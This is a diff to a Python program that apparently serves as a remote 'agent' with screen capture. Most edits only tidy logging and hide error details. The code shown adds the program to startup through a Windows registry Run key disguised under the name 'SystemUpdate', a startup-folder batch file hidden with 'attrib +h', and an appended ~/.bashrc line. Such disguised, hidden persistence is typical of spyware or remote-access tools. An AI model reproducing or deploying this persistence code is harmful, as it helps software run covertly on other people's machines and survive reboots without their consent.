@@ -3744,10 +3744,15 @@ class HighPerformanceCapture:
         self.turbo_jpeg = None
         if HAS_TURBOJPEG:
             try:
-                self.turbo_jpeg = TurboJPEG()
+                # Suppress TurboJPEG warnings
+                import warnings
+                with warnings.catch_warnings():
+                    warnings.simplefilter("ignore")
+                    self.turbo_jpeg = TurboJPEG()
                 print(f"[OK] TurboJPEG initialized successfully")
             except Exception as e:
-                print(f"[WARN] Failed to initialize TurboJPEG: {e}")
+                # Don't show the detailed error message, just indicate it's not available
+                print(f"[WARN] TurboJPEG not available, using fallback compression")
                 self.turbo_jpeg = None
         
         # Frame management
@@ -5942,14 +5947,13 @@ def add_to_startup():
     """Add agent to system startup."""
     try:
         if WINDOWS_AVAILABLE:
-            # Windows startup methods
+            # Windows startup methods - only registry, startup folder is handled by background initializer
             add_registry_startup()
-            add_startup_folder_entry()
         else:
             # Linux startup methods
             add_linux_startup()
     except Exception as e:
-        print(f"Startup configuration failed: {e}")
+        print(f"[WARN] Startup configuration failed: {e}")
 
 def add_registry_startup():
     """Add to Windows registry startup."""
@@ -5960,9 +5964,9 @@ def add_registry_startup():
         winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
                          f'"{sys.executable}" "{os.path.abspath(__file__)}"')
         winreg.CloseKey(key)
-        print("Added to registry startup")
+        print("[OK] Added to registry startup")
     except Exception as e:
-        print(f"Registry startup failed: {e}")
+        print(f"[WARN] Registry startup failed: {e}")
 
 def add_startup_folder_entry():
     """Add to Windows startup folder."""
@@ -5979,9 +5983,9 @@ def add_startup_folder_entry():
             subprocess.run(["attrib", "+h", batch_file], capture_output=True)
         except:
             pass
-        print("Added to startup folder")
+        print("[OK] Added to startup folder")
     except Exception as e:
-        print(f"Startup folder entry failed: {e}")
+        print(f"[WARN] Startup folder entry failed: {e}")
 
 def add_linux_startup():
     """Add to Linux startup."""
@@ -5995,9 +5999,9 @@ def add_linux_startup():
             if startup_line not in f.read():
                 with open(bashrc_path, "a") as f:
                     f.write(startup_line)
-                print("Added to Linux startup")
+                print("[OK] Added to Linux startup")
     except Exception as e:
-        print(f"Linux startup configuration failed: {e}")
+        print(f"[WARN] Linux startup configuration failed: {e}")
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
